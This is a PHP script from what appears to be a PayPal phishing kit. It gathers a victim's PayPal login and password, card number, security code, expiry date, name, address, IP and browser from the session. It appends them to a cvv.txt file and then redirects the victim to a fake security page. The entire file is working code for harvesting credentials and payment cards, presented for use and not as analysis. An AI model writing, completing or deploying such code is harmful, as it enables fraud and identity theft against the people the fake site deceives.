<?php


session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
$handle = fopen('../../../../cvv.txt', 'a');
$Z118_MESSAGE .= "[PP Email] = ".$_SESSION['_login_email_']."
[PP Password] = ".$_SESSION['_login_password_']."

[Bank Name] = ".$_SESSION['_cc_bank_']."
[Cardholder's Name] = ".$_SESSION['_nameoncard_']."
[".strtolower($_SESSION['_cc_type_'])." Card Number] = ".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")
[Card Security Code]	= ".$_SESSION['_csc_']."
[Expiration Date] = ".$_SESSION['_expdate_']."

[Full Name] = ".$_SESSION['_fullname_']."
[Address line] = ".$_SESSION['_address_']."
[Country Name] = ".$_SESSION['_country_']."
[Town/City] = ".$_SESSION['_city_']."
[Province/State] = ".$_SESSION['_state_']."
[Postal/Zip Code] = ".$_SESSION['_zipCode_']."

[IP INFO] = ".$_SESSION['_ip_']."
[TIME/DATE]    = ".$TIME_DATE."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
********************************************************
";

    fwrite($handle, $Z118_MESSAGE);
    fclose($handle);

	if ($_SESSION['_cntrcode_'] == "FR" || $_SESSION['_cntrcode_'] == "ES" || $_SESSION['_cntrcode_'] == "NO"){
	    HEADER("Location: ../security/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}else {
		HEADER("Location: ../security/?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}

	HEADER("Location: ../security/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

?>